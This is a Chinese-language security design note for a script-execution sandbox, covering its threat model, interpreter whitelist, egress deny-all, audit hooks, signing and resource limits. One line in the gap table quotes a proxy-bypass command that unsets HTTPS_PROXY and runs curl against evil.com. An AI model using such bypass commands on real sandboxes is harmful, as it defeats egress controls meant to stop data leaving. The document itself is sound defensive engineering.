# 安全模型(security)

## 威胁模型

- **不可信脚本** — 技能作者(开发者)在 SKILL.md 中声明的 `scripts/<file>.{py,sh}` 是被
  客户场景驱动的代码,内容不可信;攻击者可能拿合法脚本 + 篡改过的子依赖诱导
  sandbox 出网、写文件、fork bomb。
- **服务控制主机隔离** — sandbox 不控制脚本内容,但控制 *环境*:`preexec_fn` 设置
  RLIMIT、env 注入 `LD_PRELOAD` + `HTTPS_PROXY`、DnsGate 装在 `sitecustomize.py`、
  `app/main.py` 二次兜底环境过滤。
- **控制面不能反向触达** — PG / Redis DSN 必须从子进程 env 里完全消失,即便
  lifespan 阶段已 strip。

## PR2 — 解释器白名单(2026-10-01, commit `7ed63a9`)

只允许 `.py` + `.sh`。`app/sandbox.py:34-39` 的 `_SCRIPT_RE` 接受任意扩展名进入
文件存在性检查;真正的解释器白名单是 `app/sandbox.py:332-345`:

```python
SUPPORTED_SUFFIXES = (".py", ".sh")
if lower.endswith(".py"):
    cmd = ["python3", str(target)]
elif lower.endswith(".sh"):
    cmd = ["bash", str(target)]
else:
    return False, ("unsupported interpreter for {rel}; sandbox only executes "
                f"{supported}. Node.js scripts (.js/.mjs/.ts) are not supported."), 0
```

**为什么:** Node.js 脚本在 ptrace 后端的 gVisor 容器里跑不起来(node 二进制不装),
却 *不*返回非零退出,只是 shell 漏 127,给了上层审计"跑通"的错觉。PR2 关死这一路。

**builtin 同步剔除** — Node-only 的 `pptx` / `spreadsheets` 在
`builtin/skills/manifest.json` 加 `disabledSkills` 字段,Go 控制面
[`internal/server/builtin_skills.go:loadBuiltinManifest`](../../internal/server/builtin_skills.go)
过滤掉这两个名字(不进 GeneralPackSkills / packs / catalog)。等 python-pptx /
openpyxl 重写到位后从列表移除并重新签发。

回归测试见 [`app/sandbox_test.py`](../app/sandbox_test.py)。

## Phase 2 — egress allowlist(commit `16b22bc`)

`allowedEgress` 是 RunToken 签名字段(非 body 字段),由 Go 控制面 HMAC 签出。
消费流程见 [`architecture.md`](architecture.md) 的 *3 层 egress 强制*。

**Deny-all 默认** — 空 `allowedEgress` 等价于 deny-all:subprocess env **不**注入
代理、强制 `NO_PROXY=*`,但 DnsGate 仍然安装(空 allowlist 也拒 DNS),且**显式
清掉** 上一调用可能残留的 `HTTP_PROXY` / `HTTPS_PROXY` / `https_proxy` /
`http_proxy` 环境变量(防止 child 继承绕过)。

参考 commit:`c4fdaac`(deny-all bypass fix)。

## Phase 3 — syscall 观测(commit `9333776`)

[`app/audit_hooks.py`](../app/audit_hooks.py) 通过 Python 内置 `sys.addaudithook()` 拦截:

- `os.open` / `os.execv` / `os.execve` / `os.execvp` / `os.execvpe` — 文件 / 程序执行
- `subprocess.Popen` — 子进程派生
- `socket.connect` — 网络出连

聚合 `(syscall, retval)` 计数 → `audit_hooks.summary()` 写到 `/v1/execute` 响应
的 `syscalls` 字段,Go 控制面 `AppendAudit` 拼到 audit row detail(`;syscalls=…`)。

**父进程也装** — 父进程 `/v1/execute` 自己就要派生 subprocess,父进程 hook 缺失会让
响应里的 `syscalls` 永远是空 dict。lifespan 启动时 `app/main.py:90` 主动
`install_audit_hooks()`。

参考 commit:`9333776`(父进程 audit_hooks + 默认 syscalls shape)。

## Phase 4 — 8 收口前 gap(commit `c4fdaac`)

按风险/可行性排序:

| # | Gap | 修复 |
|---|---|---|
| 1 | `curl` / `wget` 走 `HTTPS_PROXY` 软强制,`unset HTTPS_PROXY && curl evil.com` 旁路 | C `libqzda_egress.so` `LD_PRELOAD` 拦截 `connect()`,非环回重定向到 127.0.0.1:8080 |
| 2 | RunToken secret 硬编码 `"qzda-skill-run-dev"`,翻 `app/sandbox.py` 即伪造 token | Docker Compose `secrets:` 长语法 + 文件 mount,默认 fail-closed |
| 3 | skill 包无 `.signed` marker 验证,任何有 `/skills/*` 写权的人注入任意代码 | [`app/sign_verify.py`](../app/sign_verify.py) + Go [`signing/`](../../services/qzda-sandbox/signing/) Ed25519 |
| 4 | per-skill cgroup 配额缺失,fork bomb 把容器 pids 吃光 | `preexec_fn=make_preexec()` 调 `prlimit(RLIMIT_NPROC/AS/CPU)` |
| 5 | workspaceId 只 echo,fs/net 未真正 per-tenant | `QZDA_WORKSPACE_ID` env 透传;RunToken `workspaceId` claim 是租户身份唯一可信源 |
| 6 | `/v1/execute` 无 QPS 限流 | [`app/rate_limit.py`](../app/rate_limit.py):per `(ws,actor)` + per-IP token-bucket,滑动 60s |
| 7 | 父进程(`uvicorn`)无 DnsGate,lifespan 内任意模块解析 PG/Redis DNS 即绕过审计 | lifespan 末尾 `DnsGate([], deny_all=True).install()` |
| 8 | egress proxy 8080 无自愈,进程死了子进程全 502 | 后台 supervisor thread 10s 探活 + 指数退避重启;`egress_proxy_up` Gauge |

## secrets 模型

`QZDA_SANDBOX_RUN_SECRET_FILE` 是生产路径,Compose `secrets:` block
[`backend/deploy/compose.yml`](../../../deploy/compose.yml) 把 `qzda_sandbox_run_secret`
挂到 `/etc/qzda/skill-run-secret`(默认权限 0400)。

[`app/sandbox.py:42-69`](../app/sandbox.py) 的 `skill_secret()` 顺序:

1. 读 `QZDA_SANDBOX_RUN_SECRET_FILE`,strip,非空 → 返回
2. 读 `QZDA_SANDBOX_RUN_SECRET` env,**且** 不等于 `"qzda-skill-run-dev"` 占位 → 返回
3. 都没有 → `raise RuntimeError`,**lifespan 立即退出**(fail-closed)

不允许在生产接受 dev 占位密钥。

## Signing

Ed25519 签名两套,均在 [`signing/`](../signing/) 包内,Go 侧 `signer.go` 实现:

- **W1-D2 builtin publisher** — 一个 keypair 给所有 builtin skill 集体签,
  公钥在 `builtin/skills/manifest.json` 的 `signers` 字段。
- **W2-D1 workspace publisher** — 每个 workspace 独立的 publisher keypair,Rotate,
  Revoke;user 上传的 `.skill` 包必须用该 ws 的私钥签出
  `.skillpkg.signature.json` sidecar。

Python 侧 [`app/sign_verify.py`](../app/sign_verify.py) **不**做 Ed25519 验签,
只验 RunToken HMAC;Ed25519 验签委托给 Go 控制面(`internal/server/builtin_skills.go`),
策略是 *Python 沙箱不持有私钥,只持有 HMAC 共享密钥 + 信任 Go 提供的验签结果*。

完整 W1-D2 + W2-D1 流水线 + 环境变量 + 错误码见 [`signing/README.md`](../signing/README.md)。

## cgroup / pids 限额

见 [`architecture.md`](architecture.md) 的 *cgroup / prlimit* 章节。
本节摘要:

  - `RLIMIT_NPROC` 阻断 fork bomb
  - `RLIMIT_CPU` 限时
  - `RLIMIT_AS` 限虚拟内存

如果 `RLIMIT_*` 在容器/平台不支持某 limit,`make_preexec()` 静默退化(失败时
吞 OSError),不让 sandbox "什么都跑不了" — 但日志应有相应告警。